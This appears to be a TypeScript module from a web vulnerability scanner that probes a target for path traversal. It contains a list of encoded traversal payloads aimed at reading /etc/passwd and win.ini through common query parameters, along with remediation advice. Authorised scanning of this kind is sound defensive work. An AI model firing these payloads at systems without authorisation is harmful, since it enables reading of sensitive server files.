import { ts } from '../context';
import { probe } from '../utils/http';
import type { RealFinding, Target, LogFn } from '../context';

export async function checkPathTraversal(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing path traversal...`);
  const traversalParams = ['file', 'path', 'page', 'template', 'view', 'doc', 'document', 'include', 'load', 'read'];
  const linuxMarker = 'root:x:0:0:';
  const winMarker = '[drivers]';
  const linuxPayloads = [
    '../../../../etc/passwd',
    '..%2f..%2f..%2f..%2fetc%2fpasswd',
    '....//....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc/passwd',
    '/etc/passwd',
  ];
  const winPayloads = [
    '..\\..\\..\\..\\windows\\win.ini',
    '..%5c..%5c..%5c..%5cwindows%5cwin.ini',
    '../../../../windows/win.ini',
  ];

  for (const param of traversalParams) {
    for (const payload of [...linuxPayloads, ...winPayloads]) {
      const probeUrl = `${target.url.replace(/\/$/, '')}?${param}=${encodeURIComponent(payload)}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      const isLinux = r.body.includes(linuxMarker);
      const isWin = r.body.toLowerCase().includes(winMarker.toLowerCase());
      if (isLinux || isWin) {
        findings.push({
          title: `Path Traversal — ${isLinux ? '/etc/passwd' : 'win.ini'} Retrieved`,
          severity: 'critical',
          verification: 'verified',
          confidence: 98,
          cvss: 9.8,
          cve: null,
          description: `The '${param}' parameter traverses the file system to read sensitive files.`,
          evidence: `PROBE: ${probeUrl}\nPayload: ${param}=${payload}\nHTTP ${r.status} — ${isLinux ? '/etc/passwd' : 'win.ini'} content found`,
          remediation: 'Never use user input to construct file paths. Use an allowlist of permitted paths.',
        });
        await onLog(`[${ts()}] ⚠ PATH TRAVERSAL CONFIRMED`);
        return findings;
      }
    }
  }
  return findings;
}
